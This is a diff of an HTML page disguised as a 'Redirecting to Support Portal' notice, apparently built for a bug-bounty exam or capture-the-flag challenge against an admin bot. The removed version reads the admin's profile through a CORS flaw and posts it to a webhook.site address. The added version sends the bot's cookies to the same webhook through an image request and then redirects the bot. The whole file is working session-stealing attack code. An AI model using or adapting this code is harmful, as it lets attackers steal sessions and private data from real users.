@@ -6,34 +6,15 @@
 <body>
     <h1>Redirecting to Support Portal...</h1>
     <script>
-        // This script runs on YOUR page (no CSP) to force the ADMIN to do something
-        async function triggerAdmin() {
-            const webhook = "https://webhook.site/44abceed-c38d-44d9-a954-d2774c57877b";
-            
-            // 1. Try to steal the Admin's session via the CORS bug we found
-            // If the CSP blocks script, we use the CORS reflection to read the flag!
-            try {
-                const res = await fetch("https://api-bugbounty-exam.hashacademy.co/api/auth/profile", {
-                    credentials: "include"
-                });
-                const data = await res.json();
-                
-                // Send the Admin's private data (and likely Flag 5) to your webhook
-                await fetch(webhook, {
-                    method: "POST",
-                    mode: "no-cors",
-                    body: JSON.stringify({ source: "CORS_BYPASS", admin_data: data })
-                });
-            } catch (e) {}
+  // Force a 5-second wait to ensure the bot's session is active
+  setTimeout(() => {
+    // Use an image to leak the data (bypasses most CSP fetch blocks)
+    var i = new Image();
+    i.src = "https://webhook.site/44abceed-c38d-44d9-a954-d2774c57877b?leak=" + btoa(document.cookie);
 
-            // 2. Redirect the Admin to the message you just sent
-            // This ensures the Bot actually "views" your XSS payload
-            setTimeout(() => {
-                window.location.href = "https://bugbounty-exam.hashacademy.co/admin/messages/69e555d6bee6d6b7c6636f0d";
-            }, 2000);
-        }
-
-        triggerAdmin();
-    </script>
+    // Redirect the bot to the internal admin profile to see if it triggers a flag
+    window.location.href = "https://bugbounty-exam.hashacademy.co/api/auth/profile";
+  }, 2000);
+</script>
 </body>
 </html>
